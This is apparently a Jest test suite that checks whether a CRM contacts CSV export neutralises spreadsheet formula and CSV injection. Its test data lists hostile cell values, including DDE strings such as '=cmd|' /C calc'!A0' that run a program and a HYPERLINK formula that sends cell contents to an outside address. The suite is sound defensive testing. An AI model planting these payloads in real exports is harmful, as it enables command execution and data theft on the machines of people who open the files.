/**
 * QA adversarial sweep of the contacts export (LX-1, XC-18).
 *
 * The unit suite pins the rule cell by cell with a regex field-splitter. This
 * suite reads the WHOLE file back the way a spreadsheet does — an RFC 4180
 * parser that honours quoted CRLF, doubled quotes and the unquoted `="…"`
 * phone field — and checks two things for every hostile value, in every text
 * column and in the phone column:
 *
 *   1. the row still has exactly as many fields as there are headers (nothing
 *      split a field, nothing smuggled a line break out of a quoted cell);
 *   2. no cell would be evaluated: a cell either does not start with a
 *      trigger, is a plain number, or is the allow-listed `="<phone>"` text form.
 */

import { CSV_BOM } from '@/lib/payments/csv';
import { buildContactsCsvFile } from '@/lib/crm/contactsCsv';

const HEADERS = ['First', 'Last', 'Email', 'Phone', 'Stage', 'Source', 'Tags', 'Created'];
const PHONE = 3;
const TEXT_COLUMNS = [0, 1, 2, 4, 5, 6];

/**
 * RFC 4180 reader, lenient the way Excel and Python's `csv` are: a quote that
 * is not at the start of a field is a literal character.
 */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  let atFieldStart = true;

  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i++;
        } else {
          quoted = false;
        }
      } else {
        cell += ch;
      }
      continue;
    }
    if (ch === '"' && atFieldStart) {
      quoted = true;
      atFieldStart = false;
    } else if (ch === ',') {
      row.push(cell);
      cell = '';
      atFieldStart = true;
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      atFieldStart = true;
      i++;
    } else {
      cell += ch;
      atFieldStart = false;
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];
const isNumeric = (s: string) => s.trim() !== '' && Number.isFinite(Number(s.replace(/,/g, '')));
const isPhoneText = (s: string) => /^="\+?[\d ().-]+"$/.test(s);

/** Would a spreadsheet evaluate this parsed cell value? */
function isLive(value: string, column: number): boolean {
  if (!value) return false;
  if (column === PHONE && isPhoneText(value)) return false;
  return TRIGGERS.includes(value[0]) && !isNumeric(value);
}

const HOSTILE = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(1+1)',
  '\t=1+1',
  '\r=1+1',
  '\n=1+1',
  "=cmd|' /C calc'!A0",
  "+cmd|' /C calc'!A0",
  '-2+3+cmd|\' /C calc\'!A0',
  '@SUM(A1:A9)',
  '=HYPERLINK("https://example.invalid/?x="&A1,"Invoice")',
  '1,=HYPERLINK("x")',
  'a,b,c',
  'say "hi"',
  '"',
  '""',
  'line1\r\nline2',
  'line1\r\n=1+1',
  'line1\n=1+1',
  'a\r=1+1',
  '=',
  '+',
  '-',
  '@',
  '-Infinity',
  '+0x1A',
  'דנה=1+1',
  ' =1+1',
  '＝1+1',
  '＋1+1',
  ' =1+1',
];

const PHONES = [
  '+972-54-123-4567',
  '054 123 4567',
  '(054) 1234567',
  '+972 (54) 123-4567',
  '05.41.23',
  '  0541234567  ',
  '1,=HYPERLINK("x")',
  '+1 =1',
  '0541234567,=1+1',
  '054"),HYPERLINK("x',
  '054\r\n=1+1',
  '054\n=1+1',
  '054\t1',
  '054 123',
  '٥٤٣',
  '０５４',
  '=054',
  '-1+1',
  '()',
  '+',
  '',
];

const baseRow = () => ['Dana', 'Levi', 'dana@example.com', '0541234567', 'Lead', 'Website', 'vip', '10/25/2026'];

function build(rows: string[][]) {
  const file = buildContactsCsvFile(HEADERS, rows, PHONE);
  expect(file.startsWith(CSV_BOM)).toBe(true);
  return parseCsv(file.slice(CSV_BOM.length));
}

describe('hostile values in every text column', () => {
  const cases = HOSTILE.flatMap(value => TEXT_COLUMNS.map(column => [JSON.stringify(value), column, value] as const));

  it.each(cases)('%s in column %i keeps 8 fields and does not evaluate', (_label, column, value) => {
    const row = baseRow();
    row[column] = value;
    const parsed = build([row]);

    expect(parsed).toHaveLength(2);
    expect(parsed[1]).toHaveLength(HEADERS.length);
    parsed[1].forEach((cell, index) => expect(isLive(cell, index)).toBe(false));
    // The phone is untouched by a neighbour's payload.
    expect(parsed[1][PHONE]).toBe('="0541234567"');
  });
});

describe('hostile and real-world values in the phone column', () => {
  it.each(PHONES.map(value => [JSON.stringify(value), value] as const))(
    'phone %s keeps 8 fields and does not evaluate',
    (_label, value) => {
      const row = baseRow();
      row[PHONE] = value;
      const parsed = build([row]);

      expect(parsed).toHaveLength(2);
      expect(parsed[1]).toHaveLength(HEADERS.length);
      parsed[1].forEach((cell, index) => expect(isLive(cell, index)).toBe(false));
    }
  );

  it.each([
    ['+972-54-123-4567', '="+972-54-123-4567"'],
    ['054 123 4567', '="054 123 4567"'],
    ['(054) 1234567', '="(054) 1234567"'],
  ])('real phone %s keeps the text form', (value, expected) => {
    const row = baseRow();
    row[PHONE] = value;
    expect(build([row])[1][PHONE]).toBe(expected);
  });

  it.each([
    ['1,=HYPERLINK("x")', '1,=HYPERLINK("x")'],
    ['+1 =1', "'+1 =1"],
    ['=054', "'=054"],
  ])('non-phone %s falls back to the neutralised value', (value, expected) => {
    const row = baseRow();
    row[PHONE] = value;
    expect(build([row])[1][PHONE]).toBe(expected);
  });
});

describe('the whole file at once', () => {
  it('one row per contact and 8 fields each, with every payload mixed in', () => {
    const rows = [
      ...HOSTILE.map(value => {
        const row = baseRow();
        TEXT_COLUMNS.forEach(column => (row[column] = value));
        return row;
      }),
      ...PHONES.map(value => {
        const row = baseRow();
        row[PHONE] = value;
        return row;
      }),
    ];
    const parsed = build(rows);

    expect(parsed).toHaveLength(rows.length + 1);
    parsed.forEach(line => expect(line).toHaveLength(HEADERS.length));
    parsed.slice(1).forEach(line => line.forEach((cell, index) => expect(isLive(cell, index)).toBe(false)));
  });

  it('a hostile text value reads back as the value typed, behind one apostrophe', () => {
    const row = baseRow();
    row[0] = "=cmd|' /C calc'!A0";
    row[6] = 'line1\r\n=1+1';
    const parsed = build([row]);
    expect(parsed[1][0]).toBe("'=cmd|' /C calc'!A0");
    // A newline inside a quoted cell stays inside it.
    expect(parsed[1][6]).toBe('line1\r\n=1+1');
  });
});
